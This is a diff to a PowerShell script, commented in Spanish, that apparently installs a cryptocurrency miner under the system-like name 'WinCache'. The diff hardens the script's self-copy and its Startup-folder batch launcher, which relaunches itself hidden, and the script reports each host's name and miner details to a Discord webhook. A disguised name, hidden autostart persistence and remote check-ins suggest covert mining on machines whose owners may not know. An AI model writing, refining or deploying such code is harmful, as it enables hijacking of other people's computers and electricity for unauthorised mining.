@@ -392,17 +392,23 @@ if ($Wallet -and $Pool -and $Algo) {
     if ([string]::IsNullOrWhiteSpace($DiscordWebhook) -and $cfg.discordWebhook) { $DiscordWebhook = $cfg.discordWebhook }
 }
 
-# ---------- install self ----------------------------------------------------
+# ---------- install self (con validación) -----------------------------------
 if ($scriptPath -ne $SelfPs) {
     Copy-Item $scriptPath $SelfPs -Force
+    Unblock-File $SelfPs -ErrorAction SilentlyContinue
+
+    # Guard: si lo copiado no es PowerShell válido, abortamos antes de dejar
+    # un watcher roto en Startup. Evita el bug de "el .bat se copia encima
+    # del .ps1 y en el siguiente login explota con CommandNotFoundException".
+    $head = (Get-Content $SelfPs -TotalCount 1 -ErrorAction SilentlyContinue)
+    if ($head -notmatch '^#Requires' -and $head -notmatch '^<#' -and $head -notmatch '^\[CmdletBinding') {
+        Remove-Item $SelfPs -Force -ErrorAction SilentlyContinue
+        throw "WinCache.ps1 copiado no parece PowerShell válido (primera línea: '$head'). Abortando para no romper el auto-arranque."
+    }
     Write-Host "[+] Installed $SelfPs"
 }
 
 # ---------- startup BAT -----------------------------------------------------
-# FIX: se reemplaza el VBS por un .bat que se relanza a sí mismo oculto vía
-# Start-Process -WindowStyle Hidden. El .bat original (el de Startup) muestra
-# un flash breve de consola, el hijo relanzado es 100% invisible. Cada paso
-# queda escrito en boot.log para poder diagnosticar si no arranca.
 $bat = @"
 @echo off
 setlocal EnableExtensions
@@ -433,6 +439,13 @@ echo [%date% %time%] watcher exited, errorlevel=%errorlevel% >> "%BOOTLOG%"
 exit /b 0
 "@
 Set-Content -Path $BatPath -Value $bat -Encoding ASCII
+
+# Guard: verificar que el bat escrito empieza con @echo off (sintaxis válida).
+$batHead = (Get-Content $BatPath -TotalCount 1) -replace '\s',''
+if ($batHead -ne '@echooff') {
+    throw "WinCache.bat generado no parece batch válido (primera línea: '$batHead')."
+}
+
 $startup = [Environment]::GetFolderPath('Startup')
 $link    = Join-Path $startup 'WinCache.bat'
 Copy-Item $BatPath $link -Force
@@ -458,12 +471,6 @@ if ($Foreground) {
 }
 
 # ---------- notify and summary ----------------------------------------------
-<#if ($Wallet -and -not $Uninstall) {
-    try {
-        Start-Process "https://rvn.2miners.com/es/account/$Wallet#farms" -ErrorAction SilentlyContinue
-    } catch {}
-}
-#>
 if ($DiscordWebhook) {
     $pidInfo = if ($p) { "Watcher PID: $($p.Id)" } else { "Mode: Foreground" }
     $msg = "Host: $($env:COMPUTERNAME)`nWorker: $Worker`nPool: $Pool`nAlgo: $Algo`n$pidInfo"
